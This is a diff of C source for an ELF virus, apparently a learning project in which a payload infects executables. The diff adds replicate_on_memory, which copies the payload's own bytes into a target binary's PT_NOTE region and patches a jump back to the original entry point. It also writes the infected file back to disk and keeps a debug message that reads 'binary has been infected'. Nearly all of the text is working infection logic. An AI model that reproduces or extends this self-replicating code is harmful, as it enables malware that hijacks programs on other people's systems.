@@ -6,7 +6,7 @@
 
 static void write_on_memory(const struct s_info *info, char *ptr)
 {
-	size_t index = 0;
+	unsigned long index = 0;
 	char *dst = ptr;
 	char *src = info->ptr;
 	
@@ -22,16 +22,36 @@ static void write_on_memory(const struct s_info *info, char *ptr)
 	}
 	while (index < info->note->p_offset + PAYLOAD_SIZE)
 	{
-		*dst++ = 42;
+		*dst++ = 0;
 		index++;
 	}
+}
+
+static void replicate_on_memory(const struct s_info *info, char *ptr)
+{
+	char *dst;
+	unsigned char *src;
+	unsigned long back = 0;
+	const Elf64_Addr entry_point = (info->old_entry - info->new_entry) - (PAYLOAD_SIZE);
+
+	dst = ptr + info->note->p_offset;
+	src = (unsigned char *)&test;
+
+	for (unsigned long index = 0; index < PAYLOAD_SIZE; index++)
+	{
+		if (*src== 0xe9 && back == 0)
+			back = index + 1;
+		*dst++ = *src++;
+	}
+	
+	_memcpy(ptr + info->note->p_offset + back, &entry_point, sizeof(int));
 }
 
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void inject(const struct s_info *info, __attribute__((unused))const size_t m_entry, const int trace)
+void inject(const struct s_info *info, const unsigned long m_entry, const int trace)
 {
 	char *ptr;
 
@@ -39,14 +59,16 @@ void inject(const struct s_info *info, __attribute__((unused))const size_t m_ent
 		Exit(0);
 
 	write_on_memory(info, ptr);
+	replicate_on_memory(info, ptr);
 
 	if (_write(info->fd, ptr, info->note->p_offset + PAYLOAD_SIZE) < 0)
 		Exit(0);
 
 	_munmap(ptr, info->note->p_offset + PAYLOAD_SIZE);
 
-	// BEG_TRACE
-	char buf1[] = "binary has been infected\n";
+#ifdef DEBUG
+	char buf1[] = "binary has been infected\n\n";
 	_write(trace, buf1, _strlen(buf1));
-	// END_TRACE
+	(void)m_entry;
+#endif
 }
